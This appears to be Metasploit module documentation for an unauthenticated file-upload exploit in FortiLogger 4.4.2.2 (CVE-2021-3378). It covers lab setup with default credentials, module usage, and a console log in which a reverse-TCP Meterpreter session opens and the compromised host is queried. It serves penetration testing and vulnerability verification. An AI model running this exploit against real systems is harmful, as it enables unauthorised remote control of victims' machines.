## Vulnerable Application

FortiLogger is a web-based logging and reporting software designed specifically for FortiGate firewalls,
running on Windows operating systems. It contains features such as instant status tracking, logging, search / filtering,
reporting and hotspot.

This module exploits an unauthenticated arbitrary file upload via insecure `POST` request on company logo upload
for hotspot settings of FortiLogger 4.4.2.2.

You can download installation file from following url:
https://github.com/erberkan/erberkan.github.io/raw/master/2021/cve-2021-3378/Fortilogger-4.4.2.zip

*(Vendor has removed vulnerable version from web page of vendor for download.)*

### Prerequisites

1. Start a Windows VM *(Tested on Windows 10 Enterprise)*
2. Install a vulnerable version which is 4.4.2.2 of FortiLogger via above url. *(Vendor has removed this version on
   their web page)*
3. After installation, verify that the server is working by visiting it with a browser.
    - Default port: 5000
    - Default username:password - admin:admin


## Verification Steps

1. Install the application
1. Start msfconsole
2. Do: `use exploit/windows/http/fortilogger_arbitrary_fileupload`
3. Set `RHOSTS`
4. Do: `run` or `exploit`
5. **Verify** that `The target is vulnerable.` message appeared
6. **Verify** that payload uploaded to target system successfully: `Payload has been uploaded !`
7. **Verify** that you getting a meterpreter session.

## Options

1.  `RHOSTS`. IP address or FQDN of target system that is FortiLogger 4.4.2.2 is running on it.
2.  `RPORT`. Default port number is `5000`.


## Scenarios

```
msf6 > use exploit/windows/http/fortilogger_arbitrary_fileupload 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > show options 

Module options (exploit/windows/http/fortilogger_arbitrary_fileupload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the FortiLogger
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.46     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   FortiLogger - 4.4.2.2


msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set rhosts 192.168.16.128
rhosts => 192.168.16.128
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > run

[*] Started reverse TCP handler on 192.168.1.46:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[+] Generate Payload !
[+] Payload has been uploaded !
[*] Executing payload...
[*] Sending stage (175174 bytes) to 192.168.1.46
[*] Meterpreter session 1 opened (192.168.1.46:4444 -> 192.168.1.46:59563) at 2021-03-01 00:40:26 +0300

meterpreter > getuid
Server username: DESKTOP-QFNKFIO\brkn
meterpreter > sysinfo 
Computer        : DESKTOP-QFNKFIO
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > pwd
C:\Program Files\RZK\Fortilogger\App
meterpreter > 


```

## Reference
1. https://erberkan.github.io/2021/cve-2021-3378/
